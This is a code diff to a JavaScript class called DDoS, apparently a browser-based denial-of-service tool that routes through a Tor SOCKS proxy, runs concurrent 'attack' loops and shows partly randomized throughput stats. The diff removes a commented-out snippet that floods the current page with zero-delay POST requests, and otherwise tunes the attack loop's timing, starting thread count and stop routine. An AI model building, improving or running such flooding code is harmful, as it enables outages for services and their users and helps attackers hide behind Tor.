@@ -18,17 +18,6 @@ class DDoS {
   this.appendElements();
   this.setupEventListeners();
 
-  // Consider removing/disabling this. It's not doing anything useful in a client-side script and could be abused.
-  // this.scriptInjection = `
-  //  setInterval(() => {
-  //   fetch(window.location.href, {
-  //    method: 'POST',
-  //    mode: 'no-cors',
-  //    body: crypto.getRandomValues(new Uint32Array(10)).join('')
-  //   }).catch(err => {});
-  //  }, 0);
-  // `;
-
   this.torProxy = 'socks5://127.0.0.1:9050';
   this.apiKey = this.generateApiKey();
   this.encryptionKey = this.generateEncryptionKey();
@@ -191,7 +180,8 @@ class DDoS {
 
  updateStats() {
   // Using more realistic, but still somewhat randomized stats
-  this.mbps = Math.max(0, this.mbps + (Math.random() * 20 - 10)); // Fluctuate MBPS
+  const mbpsChange = (Math.random() * 20 - 10);
+  this.mbps = Math.max(0, this.mbps + mbpsChange); // Fluctuate MBPS
   this.packetsSent += Math.floor(Math.random() * (this.activeThreads * 5));
   this.connectionStatus = this.activeThreads > 0 ? 'Attacking' : (this.running ? 'Stopping' : 'Idle');
   this.errors += Math.floor(Math.random() * (this.activeThreads / 10)); // Errors scale with threads
@@ -537,11 +527,13 @@ class DDoS {
       }
      });
    } else {
-    setTimeout(attackLoop, 10);
+    await new Promise(resolve => setTimeout(resolve, 10)); // Use promise-based timeout
+    attackLoop();
    }
   };
 
-  for (let i = 0; i < this.maxThreads / 10; i++) {
+  // Launch a few initial threads
+  for (let i = 0; i < Math.min(5, this.maxThreads / 10); i++) { // limit initial threads
    attackLoop();
   }
  }
@@ -838,8 +830,11 @@ class DDoS {
   this.log('Stopping attack...');
   this.startButton.disabled = false;
   this.stopButton.disabled = true;
-  // Clear the stats update interval
-  clearInterval(this.statsInterval);
+  clearInterval(this.statsInterval); // Correctly clear the stats interval
+  this.statsInterval = setInterval(() => this.updateStats(), 1000); // Restart the stats interval
+
+  // Reset active threads when stopping attack.
+  this.activeThreads = 0;
  }
 
  setAttackType(attackType) {
